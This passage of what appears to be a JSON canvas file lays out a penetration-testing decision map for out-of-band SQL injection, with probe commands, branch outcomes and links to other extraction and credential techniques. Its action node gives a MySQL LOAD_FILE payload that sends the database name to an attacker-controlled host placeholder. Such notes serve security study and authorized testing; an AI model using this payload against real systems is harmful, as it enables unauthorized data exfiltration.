      "y": 40721,
      "width": 350,
      "height": 250,
      "text": "## Conditional: validate an out-of-band SQL request channel\n\nSQL execution is plausible but in-band output is unavailable",
      "color": "5"
    },
    {
      "id": "method:sql-oob:discover",
      "type": "text",
      "x": 5250,
      "y": 40681,
      "width": 780,
      "height": 180,
      "text": "### Discover\n\n```text\ncurl -sk -D - --get --data-urlencode 'PARAM=BASELINE_VALUE' http://TARGET:PORT/PATH\n```"
    },
    {
      "id": "method:sql-oob:interpret",
      "type": "text",
      "x": 6180,
      "y": 40661,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nLack of an in-band channel motivates investigation but does not prove an outbound channel exists.",
      "color": "6"
    },
    {
      "id": "method:sql-oob:validate",
      "type": "text",
      "x": 6180,
      "y": 40907,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nConfirm the exact function, database/OS rights, allowed egress and a uniquely correlated controlled receiver event.",
      "color": "2"
    },
    {
      "id": "method:sql-oob:checks",
      "type": "text",
      "x": 5250,
      "y": 40921,
      "width": 780,
      "height": 156,
      "text": "### Validate the condition\n\n```bash\nss -lnt\nip route get TARGET\n```"
    },
    {
      "id": "method:sql-oob:enabled",
      "type": "text",
      "x": 6960,
      "y": 40611,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nThe query generates only the expected controlled event: select the bounded outbound channel.\n\n**Verify:** Correlate the query and unique receiver event; do not claim arbitrary database extraction from one callback.\n\n[[notes/web-exploitation.md#sql-oob|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:sql-oob:ruledout",
      "type": "text",
      "x": 6960,
      "y": 40952,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nThe required function or outbound permission is unavailable: discard this OOB mechanism.",
      "color": "1"
    },
    {
      "id": "method:sql-oob:unknown",
      "type": "text",
      "x": 6960,
      "y": 41173,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nNo callback leaves query execution and egress unresolved; use another stable channel if available.",
      "color": "2"
    },
    {
      "id": "method:sql-oob:action",
      "type": "text",
      "x": 7810,
      "y": 40611,
      "width": 900,
      "height": 228,
      "text": "### Procedure entry — full sequence in the note\n\n```sql\nSELECT LOAD_FILE(CONCAT('\\\\\\\\LHOST\\\\', DATABASE()));\n```\n\n[[notes/web-exploitation.md#sql-oob|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:sql-oob:next-0",
      "type": "text",
      "x": 7810,
      "y": 40929,
      "width": 620,
      "height": 252,
      "text": "### Infer SQL data through boolean or time-based differences\n\n**When:** Query influence exists but rows are not rendered\n\n**Still required:** A stable boolean response difference or controlled DB-specific delay; comparable repeated baseline requests\n\n**Infer SQL data through boolean or time-based differences — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:sql-oob:next-1",
      "type": "text",
      "x": 7810,
      "y": 41236,
      "width": 620,
      "height": 252,
      "text": "### Extract data through UNION and visible SQL results\n\n**When:** An injectable SELECT renders query results\n\n**Still required:** Compatible column count/types, a reflected result position and rights to the requested data\n\n**Extract data through UNION and visible SQL results — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:sql-oob:next-2",
      "type": "text",
      "x": 7810,
      "y": 41543,
      "width": 620,
      "height": 276,
      "text": "### Classify the artifact and its identity context\n\n**When:** A secret-like value, key file, stored hash, challenge response or ticket\n\n**Still required:** Artifact provenance and format; possible local/domain/application identity and compatible protocol\n\n[[tracks/05 Credentials.canvas|Classify the artifact and its identity context → 05 Credentials]]",
      "color": "5"
    },
    {
      "id": "track-title",
      "type": "text",
